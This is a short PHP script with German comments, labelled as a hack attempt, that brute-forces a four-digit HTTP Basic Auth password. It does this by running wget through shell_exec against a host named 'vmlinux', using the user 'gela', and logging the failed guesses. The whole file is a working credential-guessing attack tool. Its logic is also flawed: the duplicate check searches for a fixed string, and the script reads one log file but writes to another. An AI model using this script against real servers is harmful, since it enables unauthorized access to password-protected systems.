<?php
print "Hackverusch Vmlinux-HTACCES\n";

function randomstring($length) {
  // $chars - String aller erlaubten Zahlen
  $chars = "1234567890";
  // Funktionsstart
  srand((double)microtime()*1000000);
  $i = 0; // Counter auf null
  while ($i < $length) { // Schleife solange $i kleiner $length
    // Holen eines zufälligen Zeichens
    $num = rand() % strlen($chars);
    // Ausf&uuml;hren von substr zum wählen eines Zeichens
    $tmp = substr($chars, $num, 1);
    // Anhängen des Zeichens
    $pass = $pass . $tmp;
    // $i++ um den Counter um eins zu erhöhen
    $i++;
  }
  // Schleife wird beendet und 
  // $pass (Zufallsstring) zurück gegeben
  return $pass;
}



$ja = 0;

  while ($ja == 0) {

$testpw = randomstring(4);

$meinString = file_get_contents("/home/arthur/hs/files/used.txt");
$findMich   = 'testi';
$pos = strpos($meinString, $findMich);

// Der !==-Operator kann ebenfalls verwendet werden. Die Verwendung von != von
// != würde in unserem Beispiel nicht wie erwartet arbeiten, da die Position
// von 'a' 0 ist. Das Statement (0 != false) evaluiert hierbei zu false.
if ($pos !== false) {

$used = 1;

}
else {

$used = 0;

}

print $used;




if($used == 0) {

print "Tetse Passwort: \033[36m" . $testpw . "\033[39m\nWGET-AUsagbe:\n";
$log = shell_exec("wget --http-user=gela --http-passwd=" . $testpw . " http://vmlinux/TraMonyGUI2/index.php");
print "\nDownlaoding...";
if(file_exists("index.php")) {

$ja = 1;

print "\n\033[31mPOSITIV!!! DAS PASSWORT IST " . $testpw;	
	
exit;
	}
	
else {
	print "\033[34mnegativ\n\033[39m";
	
	$daten = $testpw . ";";

// Festlegen des Dateinamens
$datei_name = "/home/arthur/hs/files/used-nr.txt";

/* 
Die Datei wird zum schreiben geöffnet
und falls der Dateiname bereits vorhanden ist,
wird der komplette alte Inhalt vorher gelöscht!
*/
$fp = fopen($datei_name, "a");

/*
 Daten in Datei schreiben.
Dieser Befehl kann widerholt aufgerufen werden.
*/
fwrite($fp, $daten);

// Die Datei wird geschlossen.
fclose($fp);
}
  }
 }
?>
